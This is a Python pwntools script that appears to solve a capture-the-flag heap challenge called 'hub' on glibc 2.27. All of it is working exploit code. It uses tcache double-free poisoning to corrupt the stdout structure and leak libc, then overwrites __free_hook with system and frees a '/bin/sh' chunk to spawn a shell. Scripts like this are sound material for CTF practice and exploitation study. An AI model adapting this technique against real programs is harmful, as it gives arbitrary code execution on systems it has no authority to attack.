from pwn import *
import os, sys
context.log_level = 'debug'
elf = ELF("./hub")
prog = './hub'
libc = ELF("./libc-2.27.so")
os.system("patchelf --set-interpreter ./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so "+prog)
os.system("patchelf --set-rpath ./glibc-all-in-one/libs/2.27-3ubuntu1_amd64 "+prog)
p = process(prog)
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()
def add(size):
	p.sendlineafter(">>", '1')
	p.sendlineafter("stay?\n", str(size))

def edit(content):
	p.sendlineafter(">>", '3')
	p.sendafter("What do you want?\n", content)
def free(idx):
	p.sendlineafter(">>", '2')
	p.sendlineafter("Which hub don't you want?\n", str(idx))
def add2(size):
	p.sendlineafter('Quit\n', '1')
	p.sendlineafter("stay?", str(size))

def edit2(content):
	p.sendlineafter("Quit\n", '3')
	p.sendafter("What do you want?", content)
def free2(idx):
	p.sendlineafter("Quit\n", '2')
	p.sendlineafter("Which hub don't you want?", str(idx))
def exp():
	add(0x20)
	free(0)
	free(0)
	add(0x20)
	edit(p64(0x602020))
	add(0x20)
	add(0x20)
	add(0x20)
	edit(p64(0xfbad1887))
	add(0x30)
	free(0)
	free(0)
	add(0x30)
	edit(p64(0x602020))
	add(0x30)
	add(0x30)
	edit(p8(0x80))
	add2(0x40)
	free2(0)
	free2(0)
	add2(0x40)
	edit2(p64(0x602020))
	add2(0x40)
	add2(0x40)
	add2(0x40)
	edit2(p8(0))
	libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x3ed8b0
	free_hook = libc_base + libc.sym['__free_hook']
	log.success("libc_base ==> " + hex(libc_base))
	add2(0x50)
	free2(0)
	free2(0)
	add2(0x50)
	edit2(p64(free_hook))
	add2(0x50)
	add2(0x50)
	edit2(p64(libc_base + libc.sym['system']))
	add2(0x60)
	edit2('/bin/sh\x00')
	
	p.interactive()
if __name__ == '__main__':
	exp()
